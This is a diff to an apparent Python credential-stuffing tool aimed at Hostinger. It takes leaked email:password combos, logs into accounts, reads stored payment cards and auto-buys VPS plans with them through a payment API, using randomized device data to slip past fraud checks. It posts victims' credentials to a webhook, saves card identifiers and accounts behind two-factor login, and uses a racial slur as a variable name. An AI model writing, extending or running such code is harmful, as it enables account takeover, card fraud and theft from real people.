@@ -26,12 +26,6 @@ plans = [
     ("hostingercom-vps-kvm8-usd-24m", "479.76", "KVM 8 (12 months)")
 ]
 
-def get_good_plan(bad_plan):
-    for full, price, good in plans:
-        if full == bad_plan:
-            return good, price
-    return None 
-
 with open('combo.txt') as f:
     combo = f.read().strip().splitlines()
 
@@ -61,7 +55,13 @@ total_accounts = len(combo)
 checked_accounts = 0
 last_check_time = time.time()
 
-def randomize_device_data():
+def ggp(bad_plan):
+    for full, price, good in plans:
+        if full == bad_plan:
+            return good, price
+    return None 
+
+def rdd():
     return {
         "request_origin": random.choice(["web", "mobile", "desktop"]),
         "app_color_depth": random.choice([16, 24, 32]),
@@ -169,6 +169,8 @@ def check():
                     # AUTOBUY
                     if autobuy_enabled:
                         for entry in get_payment_methods.json()['data']:
+                            with open('results/bins.txt', 'a') as f:
+                                f.write(f'{entry['identifier']} -> {email}:{passwd}\n')
                             if entry['is_expired']:
                                 print(f'{email}:{'*' * len(passwd)} | {Fore.LIGHTYELLOW_EX}CARD{Fore.RESET} | {Fore.RED}EXPIRED{Fore.RESET} | {Fore.LIGHTYELLOW_EX}ID{Fore.RESET} {entry['id']}: {Fore.LIGHTYELLOW_EX}TOKEN{Fore.RESET}: {token}')
                             else:
@@ -323,20 +325,20 @@ def check():
                                         random_tls_extension_order=True
                                     )
 
-                                    device_data = randomize_device_data()
+                                    dd = rdd()
                                     
                                     pay_balls = clienta.post(f'https://api.processout.com/invoices/{pay_nigger.json()['data']['transaction_details']['invoice_id']}/capture?legacyrequest=true&project_id={public_key}&x-Content-Type=application/json&x-API-Version=1.3.0.0&x-Authorization=Basic%20cHJval9Lak0yR25vbGVpc2RVZ3R5UE1qY0R1ZGVpczFUQlNEUDo=', json={
                                         "authorize_only": False,
                                         "source": token,
                                         "enable_three_d_s_2": True,
-                                        "device": device_data,
-                                        "request_origin": device_data["request_origin"],
-                                        "app_color_depth": device_data["app_color_depth"],
-                                        "app_language": device_data["app_language"],
-                                        "app_screen_height": device_data["app_screen_height"],
-                                        "app_screen_width": device_data["app_screen_width"],
-                                        "app_timezone_offset": device_data["app_timezone_offset"],
-                                        "app_java_enabled": device_data["app_java_enabled"]
+                                        "device": dd,
+                                        "request_origin": dd["request_origin"],
+                                        "app_color_depth": dd["app_color_depth"],
+                                        "app_language": dd["app_language"],
+                                        "app_screen_height": dd["app_screen_height"],
+                                        "app_screen_width": dd["app_screen_width"],
+                                        "app_timezone_offset": dd["app_timezone_offset"],
+                                        "app_java_enabled": dd["app_java_enabled"]
                                     }, headers={
                                         'Authorization': 'Basic cHJval9Lak0yR25vbGVpc2RVZ3R5UE1qY0R1ZGVpczFUQlNEUDo=',
                                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
@@ -345,7 +347,7 @@ def check():
                                     print(pay_balls_response)
 
                                     if 'customer_action' not in pay_balls_response:
-                                        print(f"{Fore.LIGHTYELLOW_EX}AUTOBUY{Fore.RESET} | {f'{Fore.LIGHTGREEN_EX}SUCCESS{Fore.RESET} | {Fore.LIGHTYELLOW_EX}MESSAGE:{Fore.RESET} Successfully purchased KVM1 plan | {Fore.LIGHTYELLOW_EX}ACCOUNT:{Fore.RESET} {email}:{'*' * len(passwd)}' if pay_balls.json()['success'] else f'{Fore.RED}FAILED{Fore.RESET} | {Fore.LIGHTYELLOW_EX}MESSAGE:{Fore.RESET} {pay_balls.json()['message']}'}")
+                                        print(f"{Fore.LIGHTYELLOW_EX}AUTOBUY{Fore.RESET} | {f'{Fore.LIGHTGREEN_EX}SUCCESS{Fore.RESET} | {Fore.LIGHTYELLOW_EX}MESSAGE:{Fore.RESET} Successfully purchased {ggp(vps_plan)[0]} plan | {Fore.LIGHTYELLOW_EX}ACCOUNT:{Fore.RESET} {email}:{'*' * len(passwd)}' if pay_balls.json()['success'] else f'{Fore.RED}FAILED{Fore.RESET} | {Fore.LIGHTYELLOW_EX}MESSAGE:{Fore.RESET} {pay_balls.json()['message']}'}")
                                     else:
                                         print(f"{Fore.LIGHTYELLOW_EX}AUTOBUY{Fore.RESET} | {f'{Fore.RED}FAILED{Fore.RESET} | {Fore.LIGHTYELLOW_EX}MESSAGE:{Fore.RESET} 3D | {Fore.LIGHTYELLOW_EX}ACCOUNT:{Fore.RESET} {email}:{'*' * len(passwd)}' if pay_balls.json()['success'] else f'{Fore.RED}FAILED{Fore.RESET} | {Fore.LIGHTYELLOW_EX}MESSAGE:{Fore.RESET} {pay_balls.json()['message']}'}")
                 
@@ -359,13 +361,12 @@ def check():
                                                 f.write(f'{email}:{passwd}\n')
 
                                             if webhook_enabled:
-                                                httpx.post(webhook_url, json={'content': autobuy_message.replace("[plan]", get_good_plan(vps_plan)[0]) \
-                                                .replace("[plan_price]", get_good_plan(vps_plan)[1]) \
+                                                httpx.post(webhook_url, json={'content': autobuy_message.replace("[plan]", ggp(vps_plan)[0]) \
+                                                .replace("[plan_price]", ggp(vps_plan)[1]) \
                                                 .replace("[email]", email) \
                                                 .replace("[password]", passwd)})
 
                                             if autosetup_enabled:
-                                                time.sleep(60)
                                                 clientb = httpx.Client(proxy=f'http://{proxy_autobuy}', timeout=60)
                                                 fetch_vps = clientb.get('https://hpanel.hostinger.com/api/vps/v1/virtual-machine', headers={
                                                     'Authorization': f'Bearer {jwt}',
@@ -410,7 +411,12 @@ def check():
                                     print(pay_nigger.status_code, pay_nigger.json())
                                     print('UNKNOWN ERROR\n=================================')
                 else:
-                    print(f"{Fore.LIGHTCYAN_EX}ERROR{Fore.RESET} JVT Not Found -> " + login.text)
+                    if "https://auth.hostinger.com/v1/2fa/brand/" in login.text:
+                        print(f'{Fore.YELLOW}2FA{Fore.RESET} {email}:{passwd}')
+                        with open('results/2fa.txt', 'a') as f:
+                            f.write(f'{email}:{passwd}\n')
+                    else:
+                        print(f'{Fore.RED}ERROR{Fore.RESET} JVT Not Found')
             check_count += 1
             checked_accounts += 1
             total_checks += 1
